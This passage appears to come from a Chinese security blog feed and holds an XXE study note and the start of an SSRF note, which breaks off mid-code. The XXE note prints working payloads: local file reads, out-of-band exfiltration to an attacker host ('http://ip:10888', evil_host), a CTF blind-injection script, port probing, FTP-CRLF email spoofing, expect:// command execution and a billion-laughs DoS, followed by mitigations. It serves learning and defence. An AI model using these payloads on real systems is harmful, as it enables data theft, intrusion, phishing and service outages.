是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h5 id="3-4-2-3-实体引用字符"><a href="#3-4-2-3-实体引用字符" class="headerlink" title="3.4.2.3 实体引用字符"></a>3.4.2.3 实体引用字符</h5><p><img src="/3842592324/3.png" alt></p><h5 id="3-4-2-4-CDATA和PCDATA区别"><a href="#3-4-2-4-CDATA和PCDATA区别" class="headerlink" title="3.4.2.4 CDATA和PCDATA区别"></a>3.4.2.4 CDATA和PCDATA区别</h5><p>按照我的理解就是PCDATA会解析所有字符,如果冲突就会报错,而CDATA则不解析仍和字符.</p><h4 id="3-4-3DTD引用方式"><a href="#3-4-3DTD引用方式" class="headerlink" title="3.4.3DTD引用方式:"></a>3.4.3DTD引用方式:</h4><ul><li>DTD内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>DTD外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”&gt;</code></li><li>引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></li></ul><h3 id="3-5-实体"><a href="#3-5-实体" class="headerlink" title="3.5 实体"></a>3.5 实体</h3><p>实体可以理解成变量,给一段代码或数据起一个名字,方便在别的地方引用.<br>大致分为两类:</p><ol><li>一般实体(格式：&amp;实体引用名;)</li><li>参数实体(格式：%实体引用名;)</li></ol><p>其次还有内外之分,外部实体表示外部文件的内容,用 SYSTEM 关键词表示.而造成XXE的一般就是外部实体</p><h5 id="3-5-1-一般实体"><a href="#3-5-1-一般实体" class="headerlink" title="3.5.1 一般实体"></a>3.5.1 一般实体</h5><ol><li><p>一般内部实体<br>格式:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>举例:以下就声明了x,y两个内部实体</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [ &lt;!ENTITY x "Hello"></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">y</span> <span class="token attr-name">"World!"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&x;">&amp;x;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>y</span><span class="token punctuation">></span></span><span class="token entity" title="&y;">&amp;y;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>y</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre></li><li><p>一般外部实体<br>外部实体表示外部文件的内容<br>格式:<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>举例:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h5 id="3-5-2-参数实体"><a href="#3-5-2-参数实体" class="headerlink" title="3.5.2 参数实体"></a>3.5.2 参数实体</h5><p>参数实体使用<code>% 实体名(这里面空格不能少)</code>在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用</p></li><li><p>内部参数实体<br>格式:<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [ &lt;!ENTITY % name "test"></span> %name;]></code></pre></li><li><p>外部参数实体<br>格式:<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>举例:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM "file:///etc/passwd"></span> %name;]></code></pre><h5 id="3-5-3外部实体支持的协议"><a href="#3-5-3外部实体支持的协议" class="headerlink" title="3.5.3外部实体支持的协议"></a>3.5.3外部实体支持的协议</h5><p>更多协议的引入这就提供了更多操作空间<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p></li></ol><h2 id="0x04-XXE攻击方式"><a href="#0x04-XXE攻击方式" class="headerlink" title="0x04 XXE攻击方式"></a>0x04 XXE攻击方式</h2><p>基本的前置知识就上面这些,其实通过后面的实体,攻击的思路基本就出来了,就是利用外部实体来进行攻击,具体看下面(php&gt;=5.38的版本当中,需要声明LIBXML_NOENT,高版本的php不在默认解析实体)<br>LIBXML_NOENT的官方含义过于简短,大概就是允许替换外部或非外部的XML字符实体引用,踩得坑记一下.</p><h3 id="4-1有回显的文件读取"><a href="#4-1有回显的文件读取" class="headerlink" title="4.1有回显的文件读取"></a>4.1有回显的文件读取</h3><p>实例代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/test.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>可以看到成功读取<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200328024529.png" alt></p><h3 id="4-2无回显的文件读取"><a href="#4-2无回显的文件读取" class="headerlink" title="4.2无回显的文件读取"></a>4.2无回显的文件读取</h3><p>正常环境当中很少会有回显,而面对没有回显的情况,我们要如何去获得读取的内容?<br>首先想到的是把数据外带出来,如何外带,首先就是实体,其本身就是一个请求,而如果我们请求的同时带上我们的数据,就可在vps中获取,这就要两次请求,一次请求来获取我们的数据,另一次请求来传送我们的数据到vps,这就要用到参数实体来进行实体引用.</p><p>测试代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>%要进行HTML编码,因为实体当中不能有%(具体参考上面),文件进行base64也是也是同理<br>payload</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>成功获取数据:<br><img src="/3842592324/1.png" alt></p><p>调用过程:<br>首先要知道XML中的实体调用的规律,先调用DTD中的在调用XML中的,切严格按照先后顺序,存在内部直接调用实体就先执行(个人总结),这样看就很清楚,首先调用remote,去加载vps上的test.dtd然后调用里面的int实体化send,继续,sent直接调用了file,调用完之后回头payload中的顺序,在调用send将其发送到我们的vps上</p><p>其实还有一种是基于错误的XXE,就不演示了</p><h3 id="4-3-内网探测"><a href="#4-3-内网探测" class="headerlink" title="4.3 内网探测"></a>4.3 内网探测</h3><p>可以看到xml的URI其实支持很多协议,这就让我们的攻击面进行了扩大,姿势变得更多,尤其是java,可支持gophar这个万能协议,这里稍微演示一下,了解就好</p><p>内网探测很简单,利用协议发包看有没有回显就好,有的师傅已经写成脚本了<br>我这里主要就写个demo测试下</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://ip/"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><p>端口的话可以这样:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>  <span class="token doctype">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:XX/" [  &lt;!ELEMENT data (#PCDATA)></span>  ]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">></span></span></code></pre><p><img src="/3842592324/2.png" alt><br>其实都可以用来两者是一样的,也可换过来用,当然,测试的场景很简单,更多的是提供个思路,真实环境中的利用还需要多思考.</p><h3 id="4-4-内网盲注"><a href="#4-4-内网盲注" class="headerlink" title="4.4 内网盲注"></a>4.4 内网盲注</h3><p>是强网杯的题目,脚本附一下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://39.107.33.75:33899/common.php'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">''</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"evil_man"</span><span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"testabcdefg@gmail.com"</span><span class="token punctuation">,</span>        <span class="token string">"comment"</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="utf-8"?>                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd">                %dtd;]>                """</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./evil.dtd'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>            payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1">                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'>">                %all;                %send;"""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token operator">*</span>i<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token string">'test {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content <span class="token operator">and</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'_'</span><span class="token punctuation">:</span>                        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">print</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token keyword">print</span> result</code></pre><h3 id="4-5文件上传"><a href="#4-5文件上传" class="headerlink" title="4.5文件上传"></a>4.5文件上传</h3><p>这其实是k0rz3n师傅出的一道题目里面的思路<a href="https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/#0X01-%E8%AF%B4%E4%B8%80%E4%B8%8B%E6%83%B3%E8%A6%81%E8%80%83%E5%AF%9F%E7%9A%84%E7%82%B9" target="_blank" rel="noopener">LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析</a><br>这里主要提一下jar://协议<br>jar://协议</p><pre><code>jar:{url}!{path}</code></pre><p>使用:</p><pre><code>jar:http://host/application.jar!/file/within/the/zip</code></pre><p>和php中的phar类似,但是phar://不能加载远程文件<br>jar 协议处理文件的过程：</p><ol><li>下载 jar/zip 文件到临时文件中</li><li>提取出我们指定的文件</li><li>删除临时文件</li></ol><p>有点类似于条件竞争,需要考虑如何获取文件的路径,以及如何延长存在的时间,还需要一个包含来利用</p><h3 id="4-6邮件伪造"><a href="#4-6邮件伪造" class="headerlink" title="4.6邮件伪造"></a>4.6邮件伪造</h3><p>若是内网存在一台易受攻击的SMTP服务器,就能利用ftp://协议结合CRLF注入向其发送任意命令,可以由此可以进行邮件伪造,造成钓鱼<br>原理:</p><blockquote><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/XXX.txt，FTP客户端将在连接中发送相应的USER命令。<br>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p></blockquote><p>demo:</p><pre><code>ftp://aEHLO aMAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;RCPT TO: &lt;victim@gmail.com&gt;DATAFrom: support@VULNERABLESYSTEM.comTo: victim@gmail.comSubject: Reset your passwordWe need to confirm your identity. Confirm your password here: http://PHISHING_URL.com.QUIT:support@VULNERABLESYSTEM.com:25</code></pre><h3 id="4-7-php-expect-RCE"><a href="#4-7-php-expect-RCE" class="headerlink" title="4.7 php expect RCE"></a>4.7 php expect RCE</h3><p>需要expect扩展<br>demo:</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dir</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">></span></span><span class="token entity" title="&cmd;">&amp;cmd;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dir</span><span class="token punctuation">></span></span></code></pre><h3 id="4-8-DOS"><a href="#4-8-DOS" class="headerlink" title="4.8 DOS"></a>4.8 DOS</h3><p>demo:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>     <span class="token doctype">&lt;!DOCTYPE lolz [     &lt;!ENTITY lol "lol"></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>     ]>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><h2 id="0x05-判断XXE漏洞是否存在"><a href="#0x05-判断XXE漏洞是否存在" class="headerlink" title="0x05 判断XXE漏洞是否存在"></a>0x05 判断XXE漏洞是否存在</h2><ol><li>content-type: application/xml 这种就可以试试,也可以自己把content-type进行测试,有时候json接口也有可能会配有解析xml的接口</li><li>传送XML是否被解析</li><li>解析后探测是否支持外部实体<br>……</li></ol><h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><p>直接附上师傅们的总结:</p><h3 id="6-1禁用外部实体"><a href="#6-1禁用外部实体" class="headerlink" title="6.1禁用外部实体"></a>6.1禁用外部实体</h3><p>PHP：</p><blockquote><p>libxml_disable_entity_loader(true);</p></blockquote><p>JAVA:</p><blockquote><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br>.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;,true" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;,true</a>);<br>.setFeature(“<a href="http://xml.org/sax/features/external-general-entities&quot;,false" target="_blank" rel="noopener">http://xml.org/sax/features/external-general-entities&quot;,false</a>)<br>.setFeature(“<a href="http://xml.org/sax/features/external-parameter-entities&quot;,false" target="_blank" rel="noopener">http://xml.org/sax/features/external-parameter-entities&quot;,false</a>);</p></blockquote><p>Python：</p><blockquote><p>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p></blockquote><h3 id="6-2-黑名单过滤"><a href="#6-2-黑名单过滤" class="headerlink" title="6.2 黑名单过滤"></a>6.2 黑名单过滤</h3><p>过滤:</p><pre><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></pre><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这次xxe学习属实是丰富了一波自己的知识储备,在此之前XXE对我来说是一片空白,是属于有点鸡肋的漏洞,远远不如SQL,RCE等,这些天通过ssrf和xxe发现,由于协议的支持,这些漏洞虽然达不到超越上面这些漏洞程度,但是可以比肩,确实是没有那种类型的漏洞是鸡肋的,只不过是自己发掘不出来罢了.十分认可k0rz3n师傅的在文章提的一句话</p><blockquote><p>你的知识面,决定着你的攻击面</p></blockquote><h2 id="0x08-PS-思维导图"><a href="#0x08-PS-思维导图" class="headerlink" title="0x08 PS:思维导图"></a>0x08 PS:思维导图</h2><p>自己画了个思维导图,主要是php方面,java不熟悉……<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200328172331.png" alt></p><h2 id="0x09-参考文章"><a href="#0x09-参考文章" class="headerlink" title="0x09 参考文章"></a>0x09 参考文章</h2><p><a href="https://xz.aliyun.com/t/3357#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-15</a><br><a href="https://xz.aliyun.com/t/6754#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6754#toc-8</a><br><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a><br><a href="http://rui0.cn/archives/993" target="_blank" rel="noopener">http://rui0.cn/archives/993</a><br><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a><br><a href="https://www.smi1e.top/dsada/" target="_blank" rel="noopener">https://www.smi1e.top/dsada/</a><br><a href="https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/</a><br><a href="https://myzxcg.github.io/20171106.html" target="_blank" rel="noopener">https://myzxcg.github.io/20171106.html</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf学习笔记</title>
      <link href="/3755095433.html"/>
      <url>/3755095433.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这是一篇菜鸟web手的ssrf学习笔记，有关ssrf的知识都会放在这里，持续更新ing……</p><h2 id="0x02-漏洞介绍"><a href="#0x02-漏洞介绍" class="headerlink" title="0x02 漏洞介绍"></a>0x02 漏洞介绍</h2><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="0x03-漏洞函数"><a href="#0x03-漏洞函数" class="headerlink" title="0x03 漏洞函数"></a>0x03 漏洞函数</h2><p>ssrf有三种类型，分别是由<code>curl_exec()、file_get_contens（）、fsockopen()</code>漏洞的基本形式如下</p><p>curl_exec():</p><pre class=" language-php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>file_get_contents():</p><pre class=" language-php"><code class="language-php">     <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>fsockopen()：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$errstr (error number $errno) \n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET $link HTTP/1.1\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"\r\n"</span><span class="token punctuation">;</span>         <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span 